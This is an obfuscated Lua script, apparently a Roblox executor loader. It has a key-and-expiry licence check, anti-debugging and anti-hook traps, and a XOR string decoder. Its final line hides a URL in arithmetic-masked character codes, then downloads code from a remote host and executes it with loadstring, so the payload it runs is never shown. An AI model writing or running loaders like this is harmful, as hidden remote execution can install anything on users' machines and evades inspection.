-- ═══ Key System Protection ═══
local function __0x_ks()
    local key = nil
    pcall(function() key = getgenv and getgenv().key end)
    if not key or type(key) ~= "string" then
        local ok, arg = pcall(function() return ... end)
        if ok and type(arg) == "string" then key = arg end
    end
    if not key or type(key) ~= "string" or #key < 1 then
        error("[KeySystem] Provide key: getgenv().key = \"YOUR_KEY\"")
    end
    local h = 5381
    for i = 1, #key do
        h = (h * 33 + string.byte(key, i)) % 4294967296
    end
    if h ~= 1350298131 then
        error("[KeySystem] Invalid key")
    end
    local eh = 1727274315
    if eh ~= 0 then
        local hw = "unknown"
        pcall(function()
            if game and game.Players and game.Players.LocalPlayer then
                hw = tostring(game.Players.LocalPlayer.UserId)
            end
        end)
        local hh = 5381
        for i = 1, #hw do
            hh = (hh * 33 + string.byte(hw, i)) % 4294967296
        end
        if hh ~= eh then
            error("[KeySystem] HWID mismatch")
        end
    end
    local exp = 1792368000
    if exp > 0 then
        local now = os and os.time and os.time() or 0
        if now > 0 and now > exp then
            error("[KeySystem] License expired")
        end
    end
end
__0x_ks()
local __0xofchm6p6_k="LCRK-DF6Y-WGDG-75NK-RFPU-AKKU-CU69"
local __0xofchm6p6_sc=string.char
local __0xofchm6p6_sb=string.byte
local __0xofchm6p6_tc=table.concat
local __0xofchm6p6_fl=math.floor
local __0xofchm6p6_bx=bit32 and bit32.bxor or function(a,b)
    local r,p=0,1
    while a>0 or b>0 do
        if a%2~=b%2 then r=r+p end
        a=__0xofchm6p6_fl(a/2); b=__0xofchm6p6_fl(b/2); p=p*2
    end
    return r
end
local function __0xofchm6p6_d(s)
    local t={}
    for i=1,#s do
        t[i]=__0xofchm6p6_sc(__0xofchm6p6_bx(__0xofchm6p6_sb(s,i),__0xofchm6p6_sb(__0xofchm6p6_k,(i-1)%#__0xofchm6p6_k+1)))
    end
    return __0xofchm6p6_tc(t)
end
pcall(function() if debug and debug.getinfo then local __0x_i=debug.getinfo(1,"S") if __0x_i and __0x_i.what=="C" then error("Debugger detected") end end if hookfunction then hookfunction=function() error("Hook detected") end end end)
if false then local x=1 end
local __0xofchm6p6_o0 = (68*48) % 2 == 0
if __0xofchm6p6_o0 then end
pcall(function() local __0x_s=0 for i=1,100 do __0x_s=__0x_s+i end if __0x_s~=5050 then error("Tamper detected") end end)
loadstring(game:HttpGet(string.char((86+104-28+28-86),(80+116-38+38-80),(58+116-74+74-58),(13+112-73+73-13),(99+115-81+81-99),(40+58-47+47-40),(38+47-42+42-38),(10+47-10+10-10),(23+115-5+5-23),(31+99-86+86-31),(74+114-9+9-74),(17+105-16+16-17),(25+112-56+56-25),(76+116-68+68-76),(24+45-56+56-24),(55+115-65+65-55),(81+104-44+44-81),(91+97-62+62-91),(6+112-90+90-6),(26+101-17+17-26),(72+114-39+39-72),(41+45-81+81-41),(10+55-38+38-10),(54+54-11+11-54),(39+46-10+10-39),(61+108-78+78-61),(12+111-79+79-12),(24+118-57+57-24),(53+97-84+84-53),(35+98-31+31-35),(62+108-59+59-62),(39+101-45+45-39),(30+46-32+32-30),(51+97-72+72-51),(19+112-39+39-19),(60+112-23+23-60),(13+47-41+41-13),(20+97-11+11-20),(18+112-89+89-18),(97+105-7+7-97),(2+47-40+40-2),(27+112-10+10-27),(78+117-15+15-78),(29+98-76+76-29),(72+108-27+27-72),(46+105-60+60-46),(66+99-51+51-66),(47+47-50+50-47),(73+114-7+7-73),(66+97-59+59-66),(23+119-6+6-23),(71+47-73+73-71),(59+79-37+37-59),(96+83-49+49-96),(67+50-97+97-67),(71+111-71+71-71),(18+99-53+53-18),(78+68-16+16-78),(10+73-31+31-10),(44+113-48+48-44),(52+106-7+7-52),(52+49-55+55-52),(42+114-55+55-42),(44+98-59+59-44),(19+67-94+94-19),(66+102-69+69-66),(34+69-99+99-34),(33+81-18+18-33),(3+63-38+38-3),(58+97-76+76-58),(8+99-56+56-8),(27+99-79+79-27),(83+101-22+22-83),(47+115-43+43-47),(25+115-45+45-25),(27+75-69+69-27),(68+101-15+15-68),(8+121-86+86-8),(83+61-42+42-83),(86+57-87+87-86),(59+54-21+21-59),(58+52-67+67-58),(4+52-13+13-4))))()
